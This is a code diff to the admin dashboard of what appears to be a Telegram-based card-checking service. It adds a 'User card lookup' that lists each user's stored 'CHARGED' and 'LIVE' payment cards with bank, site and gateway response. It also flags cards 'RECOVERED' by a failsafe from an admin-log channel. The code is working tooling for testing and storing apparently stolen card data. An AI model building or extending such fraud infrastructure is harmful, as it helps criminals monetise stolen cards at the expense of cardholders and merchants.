@@ -326,6 +326,15 @@ tr:hover td { background: rgba(139,92,246,0.04); }
   <!-- HITS -->
   <div id="tab-hits" class="panel">
     <div class="card">
+      <h2>🔎 User card lookup</h2>
+      <p class="subtitle">Search a Telegram user ID to pull their stored CHARGED + LIVE cards. Rows tagged <span class="badge danger">RECOVERED</span> were re-ingested from the admin-log channel by the failsafe.</p>
+      <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">
+        <input id="uc-id" type="text" inputmode="numeric" placeholder="Telegram user ID e.g. 123456789" style="flex:1;min-width:220px;" />
+        <button class="primary" onclick="lookupUserCards()">Search</button>
+      </div>
+      <div id="uc-result"></div>
+    </div>
+    <div class="card">
       <h2>All hits</h2>
       <p class="subtitle">Full history across all users. Click a row to see the screenshot.</p>
       <div id="hits-table"></div>
@@ -767,6 +776,48 @@ async function deleteCode(id) {
   if (!confirm("Delete this code?")) return;
   try { await api("/api/admin/codes/" + id, { method: "DELETE" }); toast("Deleted", "success"); loadCodes(currentCodesFilter); }
   catch (e) { toast(e.message, "error"); }
+}
+
+/* ---- User card lookup ---- */
+function esc(v) {
+  if (v === null || v === undefined) return '—';
+  return String(v).replace(/[&<>"']/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
+}
+function ucCardRows(list) {
+  if (!list.length) return '<tr><td colspan="6" style="text-align:center;color:var(--muted);padding:20px;">None</td></tr>';
+  return list.map(h => `<tr>
+    <td class="mono">${esc(h.card)}</td>
+    <td>${esc(h.bin_bank || h.bank)}</td>
+    <td>${esc(h.site)}</td>
+    <td>${esc(h.response)}</td>
+    <td>${h.recovered ? '<span class="badge danger">RECOVERED</span>' : '<span class="badge success">OK</span>'}</td>
+    <td>${h.created_at ? esc(new Date(h.created_at).toLocaleString()) : '—'}</td>
+  </tr>`).join("");
+}
+async function lookupUserCards() {
+  const raw = (document.getElementById("uc-id").value || "").trim();
+  const el = document.getElementById("uc-result");
+  if (!/^\d+$/.test(raw)) { toast("Enter a numeric Telegram user ID", "error"); return; }
+  el.innerHTML = '<p class="subtitle">Loading…</p>';
+  try {
+    const r = await api("/api/admin/user-cards?telegram_id=" + raw);
+    if (!r.found && r.charged.length === 0 && r.live.length === 0) {
+      el.innerHTML = '<p class="subtitle">No user or cards found for that ID.</p>';
+      return;
+    }
+    const u = r.user || {};
+    const head = r.found
+      ? `<div style="margin-bottom:12px;">👤 <b>${u.telegram_username ? '@' + esc(u.telegram_username) : esc(u.telegram_first_name || 'Unknown')}</b>
+           <span class="mono" style="color:var(--muted);">(${esc(u.telegram_id)})</span>
+           &nbsp;·&nbsp; Plan: <span class="badge info">${esc(u.plan || 'TRIAL')}</span>
+           &nbsp;·&nbsp; Charged: <b>${Number(r.counts.charged)}</b> &nbsp; Live: <b>${Number(r.counts.live)}</b></div>`
+      : `<div style="margin-bottom:12px;color:var(--muted);">No user profile row — showing recovered cards only (${r.counts.charged + r.counts.live}).</div>`;
+    const tbl = (title, list) => `
+      <h3 style="margin:14px 0 6px;">${title} <span style="color:var(--muted);font-weight:400;">(${list.length})</span></h3>
+      <table><thead><tr><th>Card</th><th>Bank</th><th>Site</th><th>Response</th><th>Source</th><th>Time</th></tr></thead>
+      <tbody>${ucCardRows(list)}</tbody></table>`;
+    el.innerHTML = head + tbl("💎 Charged", r.charged) + tbl("🔥 Live", r.live);
+  } catch (e) { el.innerHTML = ''; toast(e.message, "error"); }
 }
 
 /* ---- Hits ---- */
